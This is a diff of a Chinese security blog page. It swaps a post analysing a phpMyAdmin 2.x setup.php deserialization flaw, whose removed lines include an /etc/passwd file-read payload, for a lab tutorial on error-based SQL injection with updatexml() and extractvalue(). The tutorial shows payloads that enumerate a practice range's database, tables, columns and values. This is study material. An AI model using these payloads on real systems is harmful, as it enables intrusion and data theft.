@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="phpmyadmin反序列化, Wkai">
+    <meta name="keywords" content="（五）SQL注入—报错注入（updatexml函数）, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>phpmyadmin反序列化 | Wkai</title>
+    <title>（五）SQL注入—报错注入（updatexml函数） | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/4.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">phpmyadmin反序列化</h1>
+                    <h1 class="description center-align post-title">（五）SQL注入—报错注入（updatexml函数）</h1>
                 </div>
             </div>
         </div>
@@ -323,8 +323,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/php/">
-                                <span class="chip bg-color">php</span>
+                            <a href="/tags/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5updatexml%E5%92%8Cextractvalue/">
+                                <span class="chip bg-color">SQL报错注入updatexml和extractvalue()</span>
                             </a>
                         
                     </div>
@@ -335,8 +335,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
-                                反序列化
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
+                                SQL注入
                             </a>
                         
                     </div>
@@ -348,7 +348,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-24
+                    2020-08-26
                 </div>
                 
 
@@ -364,132 +364,57 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="0x01-漏洞说明"><a href="#0x01-漏洞说明" class="headerlink" title="0x01 漏洞说明"></a>0x01 漏洞说明</h4><p>phpmyadmin 2.x版本的<code>setup.php</code>中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p>
+                <p>&emsp;<code>updatexml()</code>函数主要用于修改查询到的内容，它总共需要三个参数，其中第二个参数必须要符合XPATH语法，否则将会返回参数错误，所以如果网页开启了错误回显，就可以使用这个函数来进行sql报错注入</p>
+<p>&emsp;正好<a href="https://tofu.exeye.run/sql/log_page" target="_blank" rel="noopener">知识盒子</a>中有个靶场开启了错误回显</p>
+<p><img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/1.png" alt="知识盒子靶场"></p>
+<p>&emsp;首先我们试试这样的payload</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>&emsp;随意输入用户名和密码，开启抓包</p>
+<p>&emsp;在提交的数据中进行报错注入</p>
+<p><img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/2.png" alt></p>
+<p>&emsp;结果没有返回任何报错信息，连语法都没出错，直接给你密码错误了</p>
+<p><img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/3.png" alt></p>
+<p>&emsp;说明通过select返回的值在函数<code>updatexml()</code>中是合法的，如果想要造就不合法的参数，可以通过字符串拼接</p>
+<p>&emsp;&emsp;字符串拼接的函数为<code>concat()</code><br>&emsp;&emsp;所以我们注入的内容应该是</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and updatexml(1,concat('</span><span class="token operator">~</span><span class="token string">',(select database()),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+<span class="token comment" spellcheck="true">//这里注意select database()两边的括号不能丢，否则就会造成其他语法错误</span></code></pre>
+<p>&emsp;&emsp;两边拼接的符号是自定义的，我选的是<code>~</code>，你也可以选别的，但如果提交方式是GET，你可千万别在URL栏中用#这个符号，否则后边给你一顿注释，啥也没注入到</p>
+<p>&emsp;&emsp;将数据提交后，可以在返回报中看到报错，提示你某个参数输入是不对的，并且这个参数值为<code>~twosecu1_ques_2~</code>，说明数据库名为<code>twosecu1_ques_2</code></p>
+<p><img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/4.png" alt></p>
+<p>&emsp;&emsp;将<code>select database()</code>换成查询通过数据库查询表名的语句</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and updatexml(1,concat('</span><span class="token operator">~</span><span class="token string">',(select table_name from information_schema.tables where table_schema='</span>twosecu1_ques_2<span class="token string">' limit 0,1),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p><img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/5.png" alt="查询到的第一个表名为user_progress"></p>
+<p>&emsp;&emsp;将select database()换成查询通过查询字段的语句</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and updatexml(1,concat('</span><span class="token operator">~</span><span class="token string">',(select column_name from information_schema.columns where table_schema='</span>twosecu1_ques_2<span class="token string">' and table_name='</span>user_progress<span class="token string">' limit 0,1),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p><img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/6.png" alt="查询到表的第一个字段为u_id"></p>
+<p>&emsp;&emsp;最后就通过字段和表名查询字段值了</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and updatexml(1,concat('</span><span class="token operator">~</span><span class="token string">',(select group_concat(u_id) from user_progress limit 0,1),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+group_concat<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将指定字段的所有值连接到一起，并用逗号分隔</span></code></pre>
+<p><img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/7.png" alt="查询到的uid字段的所有值为1，3，4"></p>
 <br>
 
-<h4 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h4><p>通过<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md" target="_blank" rel="noopener">vulhub</a>快速在docker中复现漏洞</p>
-<p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p>
+<hr>
 <br>
 
-<h4 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h4><p>使用POST的方式请求<code>setup.php</code>,即可读取<code>passwd</code>文件</p>
-<pre class=" language-php"><code class="language-php">action<span class="token operator">=</span>test<span class="token operator">&amp;</span>configuration<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"PMA_Config"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"source"</span><span class="token punctuation">,</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
-<p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p>
-<br>
-
-<h4 id="0x04-源码分析"><a href="#0x04-源码分析" class="headerlink" title="0x04 源码分析"></a>0x04 源码分析</h4><p>网上找了许多教程都只说了漏洞如何利用，却没有分析成因，无奈只好自己粗略地分析下</p>
-<br>
-
-<p>首先分析<code>setup.php</code>，发现它会将POST请求的参数<code>configuration</code>进行反序列化</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'configuration'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$action</span> <span class="token operator">!=</span> <span class="token string">'clear'</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">// Grab previous configuration, if it should not be cleared</span>
-    <span class="token variable">$configuration</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'configuration'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">// Start with empty configuration</span>
-    <span class="token variable">$configuration</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<p>而payload中<code>configuration</code>的值是序列化后的<code>PMA_Config</code>类</p>
-<pre class=" language-php"><code class="language-php">configuration<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"PMA_Config"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"source"</span><span class="token punctuation">,</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
-<br>
-
-<p>所以我们应该从源码中找到<code>PMA_Config</code>类的定义，但是<code>setup</code>文件中并没有找到，所以一定包含了其他的php文件</p>
-<p>果然，在开头处有行文件包含的代码</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'./libraries/common.lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<br>
-
-<p>顺藤摸瓜找到这个文件<code>common.lib.php</code>，结果依旧没有在找到<code>PMA_Config</code>类的定义</p>
-<p>但我通过搜索class，发现了小惊喜，common.lib.php中还包含了其他的php文件，真是一层又一层</p>
-<pre><code>require_once &#39;./libraries/sanitizing.lib.php&#39;;
-require_once &#39;./libraries/Theme.class.php&#39;;
-require_once &#39;./libraries/Theme_Manager.class.php&#39;;
-require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br>
-
-<p>终于，我在<code>Config.class.php</code>中找到了<code>PMA_Config</code>类的定义</p>
-<p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p>
-<br>
-
-<p>一般会出现php的反序列化，准是类中的魔术函数出现了问题</p>
-<p>所以重点审查对象就是这几个函数</p>
-<pre class=" language-php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象创建时被调用
-<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个对象销毁时被调用
-<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个对象被当作一个字符串使用
-<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    在对象在被序列化之前运行
-<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   将在序列化之后立即被调用</code></pre>
-<br>
-
-<p>通过审计代码发现问题果然出现在<code>__construct</code>上</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$source</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token comment" spellcheck="true">// functions need to refresh in case of config file changed goes in</span>
-    <span class="token comment" spellcheck="true">// PMA_Config::load()</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token comment" spellcheck="true">// other settings, independant from config file, comes in</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkIsHttps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<p>当一个类被创建，函数<code>__construct</code>马上就会被调用，函数中的<code>$this-&gt;load($source)</code>也会马上被执行</p>
-<br>
-
-<p>那我们再来看看函数<code>load()</code></p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$source</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadDefaults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token keyword">null</span> <span class="token operator">!==</span> <span class="token variable">$source</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setSource</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkConfigSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token variable">$cfg</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token variable">$old_error_reporting</span> <span class="token operator">=</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'file_get_contents'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token variable">$eval_result</span> <span class="token operator">=</span>
-        <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">'?>'</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//重点在这</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token variable">$eval_result</span> <span class="token operator">=</span>
-    <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">'?>'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$old_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$eval_result</span> <span class="token operator">===</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_config_file</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span>  <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_config_file</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source_mtime</span> <span class="token operator">=</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-
-
-    @<span class="token constant">TODO</span> check validity of <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pma_collation_connection'</span><span class="token punctuation">]</span>
-    <span class="token operator">/</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pma_collation_connection'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'collation_connection'</span><span class="token punctuation">,</span>
-        <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pma_collation_connection'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'collation_connection'</span><span class="token punctuation">,</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'DefaultConnectionCollation'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkCollationConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token comment" spellcheck="true">//$this->checkPmaAbsoluteUri();</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span> <span class="token operator">=</span> <span class="token function">PMA_array_merge_recursive</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span><span class="token punctuation">,</span> <span class="token variable">$cfg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<p>我们发现<code>load()</code>函数中，它调用了这一句<code>eval( &#39;?&gt;&#39; . file_get_contents($this-&gt;getSource()) );</code></p>
-<p>函数<code>getSource()</code>就是返回类的<code>source</code>的值</p>
-<p>而<code>file_get_contents</code>函数的作用就是将指定的文件转换成字符串</p>
-<p>所以将source复制为某个文件的路径就能够实现任意文件读取了，比如<code>/etc/passwd</code></p>
-<br>
-
-<p>但是最后有个疑惑<code>eval( &#39;?&gt;&#39; . &quot;string&quot;);</code>这种形式确实能够输出字符串，我却不明白他的原理</p>
-<p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p>
+<p>&emsp;有个和<code>updatexml()</code>类似的函数是<code>extractvalue()</code></p>
+<p>&emsp;<code>extractvalue()</code>相对于<code>updatexml()</code>少了一个必要参数，所以只需要第一个参数用1填充</p>
+<p>&emsp;<code>extractvalue()</code>从数据库查询到字段值基本和<code>updatexml()</code>没什么区别</p>
+<ul>
+<li>查询数据库</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and extractvalue(1,concat('</span><span class="token operator">~</span><span class="token string">',(select database()),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<ul>
+<li>查询表</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and extractvalue(1,concat('</span><span class="token operator">~</span><span class="token string">',(select table_name from information_schema.tables where table_schema='</span>twosecu1_ques_2<span class="token string">' limit 0,1),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<ul>
+<li>查询字段</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and extractvalue(1,concat('</span><span class="token operator">~</span><span class="token string">',(select column_name from information_schema.columns where table_schema='</span>twosecu1_ques_2<span class="token string">' and table_name='</span>user_progress<span class="token string">' limit 0,1),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<ul>
+<li>查询字段值</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' and extractvalue(1,concat('</span><span class="token operator">~</span><span class="token string">',(select group_concat(u_id) from user_progress limit 0,1),'</span><span class="token operator">~</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre>
 
             </div>
             <hr/>
@@ -515,7 +440,7 @@ require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://wkaiblog.cn/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                    <a href="http://wkaiblog.cn/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/">http://wkaiblog.cn/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -553,8 +478,8 @@ require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/php/">
-                                    <span class="chip bg-color">php</span>
+                                <a href="/tags/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5updatexml%E5%92%8Cextractvalue/">
+                                    <span class="chip bg-color">SQL报错注入updatexml和extractvalue()</span>
                                 </a>
                             
                         </div>
@@ -726,19 +651,18 @@ require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/">
+                <a href="/2020/08/26/JAVA%EF%BC%88%E5%8F%8D%E5%B0%84%EF%BC%89/">
                     <div class="card-image">
                         
-                        <img src="/2020/08/26/%EF%BC%88%E4%BA%94%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%E5%87%BD%E6%95%B0%EF%BC%89/4.png" class="responsive-img" alt="（五）SQL注入—报错注入（updatexml函数）">
+                        <img src="/2020/08/26/JAVA%EF%BC%88%E5%8F%8D%E5%B0%84%EF%BC%89/1.png" class="responsive-img" alt="JAVA（反射）">
                         
-                        <span class="card-title">（五）SQL注入—报错注入（updatexml函数）</span>
+                        <span class="card-title">JAVA（反射）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            &emsp;updatexml()函数主要用于修改查询到的内容，它总共需要三个参数，其中第二个参数必须要符合XPATH语法，否则将会返回参数错误，所以如果网页开启了错误回显，就可以使用这个函数来进行sql报错注入
-&emsp;正好知识盒子中
+                            关于反射&emsp;通过Class实例获取class信息的方法称为反射。Java的反射机制提供为Java工程师的开发提供了相当多的便利性，同样也带来了潜在的安全风险。反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直
                         
                     </div>
                     <div class="publish-info">
@@ -749,8 +673,8 @@ require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br>
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                    SQL注入
+                            <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" class="post-category">
+                                    编程语言
                                 </a>
                             
                             
@@ -760,8 +684,8 @@ require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5updatexml%E5%92%8Cextractvalue/">
-                        <span class="chip bg-color">SQL报错注入updatexml和extractvalue()</span>
+                    <a href="/tags/JAVA/">
+                        <span class="chip bg-color">JAVA</span>
                     </a>
                     
                 </div>
@@ -775,49 +699,50 @@ require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/">
+                <a href="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                     <div class="card-image">
                         
